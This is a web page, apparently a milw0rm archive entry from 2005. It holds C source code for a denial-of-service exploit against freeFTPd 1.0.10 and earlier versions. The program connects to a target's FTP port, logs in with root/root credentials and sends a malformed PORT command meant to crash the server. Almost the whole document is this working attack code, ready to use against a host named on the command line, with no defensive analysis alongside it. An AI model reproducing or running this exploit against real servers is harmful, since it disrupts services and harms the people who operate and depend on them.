<html><head><title>FreeFTPD <= 1.0.10 (PORT Command) Denial of Service Exploit</title></head><pre>// freeFTPd Denial of Service Attack
// Tested on a Win XP Sp1 Box


#include &quot;stdio.h&quot;
#include &quot;winsock2.h&quot;
#pragma comment (lib,&quot;ws2_32&quot;)


#define PORT 21
#define USER &quot;root&quot;
#define PASS &quot;root&quot;
#define L    &quot;--------------------------------------------------&quot;
#define HL   &quot;freeFTPd (1.0.10) DoS Exploit by steve01@chello.at&quot;
#define BOOM &quot;23&quot;

typedef unsigned long ulong;
ulong resolv_host(char *);

int main(int argc, char* argv[])
{

   WSADATA wsa;
   SOCKET s_target;
   struct sockaddr_in addr;
   WORD wsVersion;
   int err=0;

   if(argc&lt;2)
   {
       printf(&quot;%s\n&quot;,L);
       printf(&quot;%s\n&quot;,HL);
       printf(&quot;%s\n&quot;,L);
       printf(&quot;Usage: %s &lt;www.target.com&gt;\n&quot;,argv[0]);
       exit(0);
   }

   printf(&quot;%s\n&quot;,L);
   printf(&quot;%s\n&quot;,HL);
   printf(&quot;%s\n&quot;,L);


   if(WSAStartup(wsVersion=MAKEWORD(2,2),&amp;wsa))
   {
       printf(&quot;Error WSAStartup() Error Code: %d\n&quot;,WSAGetLastError());
       exit(1);
   }



   s_target=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
   if(s_target==INVALID_SOCKET)
   {
       printf(&quot;Error socket() Error Code: %d\n&quot;,WSAGetLastError());
       exit(2);
   }


   addr.sin_family = AF_INET;
   addr.sin_port = htons(PORT);
   addr.sin_addr.s_addr= resolv_host(argv[1]);

   if(connect(s_target,(SOCKADDR *)&amp;addr,sizeof(addr)))
   {
       printf(&quot;Error connect() Error Code: %d\n&quot;,WSAGetLastError());
       exit(3);
   }

   int recvsize=0;
   char recvbuffer[400];
   char sendbuffer[400];

   //recv banner
   recvsize=recv(s_target,recvbuffer,sizeof(recvbuffer)-1,0);
   recvbuffer[recvsize]='\0';
   //send user
   strncpy(sendbuffer,&quot;USER &quot;,sizeof(sendbuffer)-1);
   strncat(sendbuffer,USER,sizeof(sendbuffer)-strlen(sendbuffer)-1);
   strncat(sendbuffer,&quot;\r\n&quot;,sizeof(sendbuffer)-strlen(sendbuffer)-1);

   send(s_target,sendbuffer,strlen(sendbuffer),0);

   //recv user stuff
   recvsize=recv(s_target,recvbuffer,sizeof(recvbuffer)-1,0);
   recvbuffer[recvsize]='\0';

   strncpy(sendbuffer,&quot;PASS &quot;,sizeof(sendbuffer)-1);
   strncat(sendbuffer,PASS,sizeof(sendbuffer)-strlen(sendbuffer)-1);
   strncat(sendbuffer,&quot;\r\n&quot;,sizeof(sendbuffer)-strlen(sendbuffer)-1);

   //send pass
   send(s_target,sendbuffer,strlen(sendbuffer),0);

   //recv pass stuff
   recvsize=recv(s_target,recvbuffer,sizeof(recvbuffer)-1,0);
   recvbuffer[recvsize]='\0';

   strncpy(sendbuffer,&quot;PORT &quot;,sizeof(sendbuffer)-1);
   strncat(sendbuffer,BOOM,sizeof(sendbuffer)-strlen(sendbuffer)-1);
   strncat(sendbuffer,&quot;\r\n&quot;,sizeof(sendbuffer)-strlen(sendbuffer)-1);
   send(s_target,sendbuffer,strlen(sendbuffer),0);


   closesocket(s_target);
   WSACleanup();



   return 0;
}


ulong resolv_host(char *host)
{

ulong uhost=0;
struct hostent *th;

uhost=inet_addr(host);
if(uhost==INADDR_NONE)
{
 th=gethostbyname(host);
 if(!th)
 {
   printf(&quot;Check if %s is up \n&quot;,host);
   exit(0);
 }

 uhost=*(unsigned long*)th-&gt;h_addr;

}



return uhost;


}

// milw0rm.com [2005-11-24]</pre></html>